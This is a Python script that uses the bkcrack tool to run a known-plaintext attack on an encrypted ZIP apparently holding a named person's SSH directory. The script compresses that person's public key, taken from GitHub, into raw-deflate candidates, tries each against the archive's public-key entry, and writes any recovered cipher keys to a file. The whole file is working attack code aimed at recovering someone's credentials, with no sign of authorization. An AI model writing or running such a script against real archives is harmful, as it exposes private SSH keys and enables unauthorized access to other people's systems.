"""Run bkcrack known-plaintext attack using GitHub-discovered key."""
import subprocess
import os
import zlib

# Dan's pubkey as found on GitHub (added 2025-07-21, last used 2026-07-17)
github_key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBopeRkclOrscs+rQVfK8bXmZ3ucAiJS2s2VVXWETWV0'

# The full pubkey file would be just this key + newline (since 97 bytes uncompressed)
# Let's check both options
plaintext_candidates = [
    github_key + '\n',           # with newline at end
    github_key,                  # without newline
]

# Save each compressed version (try different compression levels)
out_dir = r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\bkcrack_work'

for i, plain in enumerate(plaintext_candidates):
    for level in [6, 9, 1, 4]:  # default, max, fast, medium
        comp = zlib.compress(plain.encode('ascii'), level)[2:]  # strip zlib header
        # Use raw deflate without zlib header (zip uses raw deflate)
        import io
        compressor = zlib.compressobj(level, zlib.DEFLATED, -15)  # raw deflate
        comp_raw = compressor.compress(plain.encode('ascii')) + compressor.flush()
        outpath = os.path.join(out_dir, f'plain_gh_{i}_lv{level}.bin')
        with open(outpath, 'wb') as f:
            f.write(comp_raw)
        print(f'  saved: {outpath} ({len(comp_raw)} bytes deflated from {len(plain)} bytes plaintext)')

# Try each with bkcrack
bk = r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\bkcrack-src\bkcrack-1.8.1\build\src\bkcrack.exe'
zip_path = r'C:\Users\eli6-admin\Documents\eli6-surveillance\camera_testing\nolandda_ssh-dir.zip'

print('\n=== Running bkcrack with GitHub key plaintext candidates ===')
for plain_path in sorted(os.listdir(out_dir)):
    if not plain_path.startswith('plain_gh_'):
        continue
    full = os.path.join(out_dir, plain_path)
    sz = os.path.getsize(full)
    print(f'\nTrying {plain_path} ({sz} bytes)...')
    try:
        result = subprocess.run([bk, '-C', zip_path, '-c', 'ssh-dir/id_ed25519_github.pub', '-p', full],
                               capture_output=True, text=True, timeout=180)
        output = (result.stdout + result.stderr).strip()
        # Find keys line
        for line in output.splitlines():
            if line.startswith('Keys:'):
                print(f'  *** FOUND KEYS: {line}')
                # Save keys
                keys = line.split(':',1)[1].strip()
                with open(os.path.join(out_dir, 'keys.txt'), 'w') as f:
                    f.write(keys)
                break
            if 'Could not find' in line:
                print(f'  No keys.')
                break
    except subprocess.TimeoutExpired:
        print(f'  Timeout')